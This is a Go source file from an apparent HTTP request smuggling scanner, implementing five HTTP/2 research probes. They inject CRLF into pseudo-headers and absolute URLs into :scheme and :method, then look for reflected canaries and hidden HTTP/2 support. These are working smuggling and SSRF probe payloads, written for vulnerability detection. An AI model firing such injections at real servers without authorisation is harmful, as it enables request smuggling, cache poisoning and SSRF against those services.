package scan

// h2research.go — H2 research-mode probes
//
// Implements the five experimental/research scanners from the Java original:
//
//   HTTP2FakePseudo  — inject fake :path pseudo-header via value CRLF injection;
//                      if the canary reflects in the response the server is
//                      concatenating or mishandling pseudo-header values.
//
//   HTTP2Scheme      — inject attacker-controlled URL into :scheme pseudo-header;
//                      if the canary reflects the proxy forwards :scheme verbatim.
//
//   HTTP2DualPath    — inject duplicate :path via CRLF in the value; if the server
//                      accepts both the second path wins — potential path confusion.
//
//   HTTP2Method      — inject absolute URL into :method pseudo-header; if the collab
//                      domain reflects the proxy is forwarding :method literally.
//
//   HiddenHTTP2      — detect hidden HTTP/2 support: server responds HTTP/1.1 to a
//                      normal request but H2 when explicitly negotiated via ALPN.
//                      Useful to find targets where H2 downgrade is possible.
//
// These are "research mode" probes — they look for reflection/anomaly rather than
// triggering a timeout desync. They are called from ScanH2Research and gated
// behind --research (or --no-skip-h2-research).

import (
	"github.com/smuggled/smuggled/internal/request"
	"fmt"
	"net/url"

	"github.com/smuggled/smuggled/internal/config"
	"github.com/smuggled/smuggled/internal/report"
)

// ScanH2Research runs all five H2 research-mode probes.
func ScanH2Research(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("H2Research")
	if target.Scheme != "https" {
		return
	}
	if !request.ProbeH2(target, cfg) {
		rep.Log("H2Research: %s does not negotiate h2, skipping", target.Host)
		return
	}

	path := target.RequestURI()
	if path == "" {
		path = "/"
	}
	host := target.Hostname()

	scanH2FakePseudo(target, path, host, cfg, rep)
	scanH2Scheme(target, path, host, cfg, rep)
	scanH2DualPath(target, path, host, cfg, rep)
	scanH2Method(target, path, host, cfg, rep)
	scanHiddenHTTP2(target, path, host, cfg, rep)
}

// ─── HTTP2FakePseudo ─────────────────────────────────────────────────────────
// Inject a fake :path pseudo-header via CRLF in a regular header value.
// If the canary reflects in the response, the server is forwarding
// the injected pseudo-header downstream.
//
// Attack: x: x\r\n:path : /<canary>
func scanH2FakePseudo(target *url.URL, path, host string, cfg config.Config, rep *report.Reporter) {
	canary := "mclmkdzXsmuggled"
	extraHeaders := map[string]string{
		"x": "x\r\n:path : /" + canary,
	}

	rep.Log("H2FakePseudo probe: target=%s", host)
	resp, err := h2RawRequest(target, "GET", path, host, "", extraHeaders, cfg)
	if err != nil {
		rep.Log("H2FakePseudo error: %v", err)
		return
	}

	dbg(cfg, "H2FakePseudo: resp status=%d canary_found=%v", resp.Status, request.ContainsStr(resp.Body, canary))
	if request.ContainsStr(resp.Body, canary) {
		rep.Emit(report.Finding{
			Target:    target.String(),
			Method:      "HTTP/2",
			Severity:  report.SeverityProbable,
			Type:      "H2-fake-pseudo",
			Technique: "HTTP2FakePseudo",
			Description: "H2 fake pseudo-header reflection: injected ':path' via CRLF in " +
				"header value was reflected in the response. The server may be " +
				"concatenating or mishandling H2 pseudo-header values, enabling " +
				"request smuggling via H2→H1 downgrade.",
			Evidence: fmt.Sprintf("canary=%q found in response", canary),
			RawProbe: fmt.Sprintf("GET %s HTTP/2\r\nHost: %s\r\nx: x\\r\\n:path : /%s\r\n\r\n", path, host, canary),
		})
		rep.Log("H2FakePseudo [!] canary reflected on %s", target.String())
	}
}

// ─── HTTP2Scheme ─────────────────────────────────────────────────────────────
// Inject an attacker-controlled URL into the :scheme pseudo-header.
// If the canary reflects, the proxy forwards :scheme verbatim — SSRF potential.
//
// Attack: :scheme = http://<host>/<canary>?
func scanH2Scheme(target *url.URL, path, host string, cfg config.Config, rep *report.Reporter) {
	canary := "mclmkdzXsmuggled"
	schemeValue := fmt.Sprintf("http://%s/%s?", host, canary)
	extraHeaders := map[string]string{
		":scheme": schemeValue,
	}

	rep.Log("H2Scheme probe: target=%s", host)
	resp, err := h2RawRequest(target, "GET", path, host, "", extraHeaders, cfg)
	if err != nil {
		rep.Log("H2Scheme error: %v", err)
		return
	}

	dbg(cfg, "H2Scheme: resp status=%d canary_found=%v", resp.Status, request.ContainsStr(resp.Body, canary))
	if request.ContainsStr(resp.Body, canary) {
		rep.Emit(report.Finding{
			Target:    target.String(),
			Method:      "HTTP/2",
			Severity:  report.SeverityProbable,
			Type:      "H2-scheme-reflection",
			Technique: "HTTP2Scheme",
			Description: "H2 :scheme pseudo-header reflection: the injected path canary " +
				"was reflected in the response. The proxy may be forwarding the " +
				":scheme value verbatim, enabling SSRF via H2 pseudo-header injection.",
			Evidence: fmt.Sprintf("canary=%q reflected; scheme=%q", canary, schemeValue),
			RawProbe: fmt.Sprintf("GET %s HTTP/2\r\nHost: %s\r\n:scheme: %s\r\n\r\n", path, host, schemeValue),
		})
		rep.Log("H2Scheme [!] canary reflected on %s", target.String())
	}
}

// ─── HTTP2DualPath ────────────────────────────────────────────────────────────
// Inject a duplicate :path via CRLF in the :path value.
// If the server accepts duplicate :path, the second value may override the first,
// leading to path confusion / cache poisoning.
//
// Attack: :path = <path>\r\n:path: /<canary>
func scanH2DualPath(target *url.URL, path, host string, cfg config.Config, rep *report.Reporter) {
	canary := "asdfwrtzXsmuggled"

	// Probe 1: CRLF-injected duplicate :path with same value — if server rejects (4xx), dual :path unsupported.
	// The :path override in extraHeaders replaces the default :path, so the HPACK frame
	// contains a single :path whose *value* embeds "\r\n:path: <path>" — the CRLF injection
	// is the attack vector, not duplicate pseudo-header keys.
	extraHeaders1 := map[string]string{
		":path": path + "\r\n:path: " + path,
	}
	rep.Log("H2DualPath probe: target=%s", host)
	resp1, err := h2RawRequest(target, "GET", path, host, "", extraHeaders1, cfg)
	if err != nil {
		return
	}
	status1 := resp1.Status
	dbg(cfg, "H2DualPath: probe1 status=%d", status1)
	if status1 >= 400 || status1 == 0 {
		return // server rejected dual :path — not vulnerable
	}

	// Probe 2: second :path points to canary — does the response differ?
	extraHeaders2 := map[string]string{
		":path": path + "\r\n:path: /" + canary,
	}
	resp2, err := h2RawRequest(target, "GET", path, host, "", extraHeaders2, cfg)
	if err != nil {
		return
	}
	status2 := resp2.Status

	// Probe 3: first :path is canary
	extraHeaders3 := map[string]string{
		":path": "/" + canary + "\r\n:path: " + path,
	}
	resp3, err := h2RawRequest(target, "GET", path, host, "", extraHeaders3, cfg)
	if err != nil {
		return
	}
	status3 := resp3.Status

	// Signal: statuses diverge between the two orderings → server processes one :path differently
	if status1 == status2 && status1 == status3 {
		return // all same — no path confusion
	}

	reflected2 := request.ContainsStr(resp2.Body, canary)
	reflected3 := request.ContainsStr(resp3.Body, canary)

	evidence := fmt.Sprintf("baseline=%d dual-path-A=%d dual-path-B=%d reflected-A=%v reflected-B=%v",
		status1, status2, status3, reflected2, reflected3)

	rep.Emit(report.Finding{
		Target:    target.String(),
		Method:      "HTTP/2",
		Severity:  report.SeverityProbable,
		Type:      "H2-dual-path",
		Technique: "HTTP2DualPath",
		Description: fmt.Sprintf(
			"H2 dual :path injection: the server accepted duplicate :path pseudo-headers "+
				"and returned different status codes (%d vs %d vs %d). "+
				"This may enable path confusion, cache poisoning, or request smuggling.",
			status1, status2, status3),
		Evidence: evidence,
		RawProbe: fmt.Sprintf("GET %s HTTP/2\r\nHost: %s\r\n:path: %s\\r\\n:path: /%s\r\n\r\n", path, host, path, canary),
	})
	rep.Log("H2DualPath [!] status divergence on %s (%s)", target.String(), evidence)
}

// ─── HTTP2Method ──────────────────────────────────────────────────────────────
// Inject an absolute URL into the :method pseudo-header.
// If the target host is reflected, the proxy forwarded :method verbatim → SSRF.
//
// Attack: :method = GET http://<canary-host><path> HTTP/1.1
func scanH2Method(target *url.URL, path, host string, cfg config.Config, rep *report.Reporter) {
	// Use the target hostname with a distinctive path as the canary
	// (avoids external DNS lookups; we look for path reflection instead)
	canaryPath := config.EffectiveCanaryPath(cfg) + "-method"
	methodValue := fmt.Sprintf("GET http://%s%s HTTP/1.1", host, canaryPath)
	extraHeaders := map[string]string{
		":method": methodValue,
	}

	rep.Log("H2Method probe: target=%s", host)
	resp, err := h2RawRequest(target, "POST", path, host, "x=y", extraHeaders, cfg)
	if err != nil {
		rep.Log("H2Method error: %v", err)
		return
	}

	dbg(cfg, "H2Method: resp status=%d canary_found=%v", resp.Status, request.ContainsStr(resp.Body, canaryPath))
	if request.ContainsStr(resp.Body, canaryPath) || request.ContainsStr(resp.Body, host+canaryPath) {
		rep.Emit(report.Finding{
			Target:    target.String(),
			Method:      "HTTP/2",
			Severity:  report.SeverityProbable,
			Type:      "H2-method-reflection",
			Technique: "HTTP2Method",
			Description: "H2 :method pseudo-header reflection: injected absolute URL in " +
				":method was reflected in the response. The proxy may be forwarding " +
				"the :method value verbatim, enabling SSRF via H2 method injection.",
			Evidence: fmt.Sprintf("method_value=%q canary_path reflected", methodValue),
			RawProbe: fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\n:method: %s\r\n\r\nx=y", path, host, methodValue),
		})
		rep.Log("H2Method [!] canary path reflected on %s", target.String())
	}
}

// ─── HiddenHTTP2 ─────────────────────────────────────────────────────────────
// Detect "hidden HTTP/2": the server responds HTTP/1.1 to a normal TLS request
// but negotiates H2 when ALPN explicitly offers it.
// This identifies targets that support H2 downgrade even without obvious HTTPS/H2.
//
// Detection:
//   1. Normal HTTPS request (no ALPN h2 offer) → check response for "HTTP/2"
//   2. Explicit H2 request via ALPN → check for "HTTP/2" in response
//   3. If (1) = H1 and (2) = H2 → hidden H2 detected
func scanHiddenHTTP2(target *url.URL, path, host string, cfg config.Config, rep *report.Reporter) {
	rep.Log("HiddenHTTP2 probe: target=%s", host)

	// H1 response (no ALPN h2 offer)
	h1Req := []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host))
	h1Resp, _, timedOut, err := request.RawRequest(target, h1Req, cfg)
	if err != nil || timedOut || len(h1Resp) == 0 {
		return
	}

	// Check: H1 response must NOT already show HTTP/2
	if request.ContainsStr(h1Resp, "HTTP/2") {
		return // server already announces H2 on normal requests
	}

	// H2 response via ALPN.
	// h2RawRequest already verifies that h2 was negotiated via ALPN before sending.
	// A non-zero status code confirms the server processed the H2 request.
	h2Resp, err := h2RawRequest(target, "GET", path, host, "", nil, cfg)
	if err != nil || h2Resp.Status == 0 {
		return
	}
	// h2RawRequest only returns without error when h2 was ALPN-negotiated,
	// so reaching here already proves hidden H2 support (H1 response confirmed above).

	h2Body := h2Resp.Body
	// Signal: H1 path gives H1, explicit H2 path gives H2 → hidden H2
	rep.Emit(report.Finding{
		Target:    target.String(),
		Method:      "HTTP/2",
		Severity:  report.SeverityInfo,
		Type:      "hidden-H2",
		Technique: "HiddenHTTP2",
		Description: "Hidden HTTP/2 detected: the server responds with HTTP/1.1 to normal " +
			"TLS requests but negotiates HTTP/2 when ALPN explicitly offers 'h2'. " +
			"This target supports H2→H1 downgrade attacks even if H2 is not " +
			"advertised publicly.",
		Evidence:    fmt.Sprintf("h1_response=HTTP/1.x; h2_alpn_status=%d", h2Resp.Status),
		RawProbe:    fmt.Sprintf("GET %s HTTP/1.1 (no ALPN h2) vs GET %s HTTP/2 (ALPN h2)", path, path),
		RawResponse: request.Truncate(fmt.Sprintf("H1: %s\nH2: %s", string(h1Resp[:min(100, len(h1Resp))]), string(h2Body[:min(100, len(h2Body))])), 300),
	})
	rep.Log("HiddenHTTP2 [!] hidden H2 support detected on %s", target.String())
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
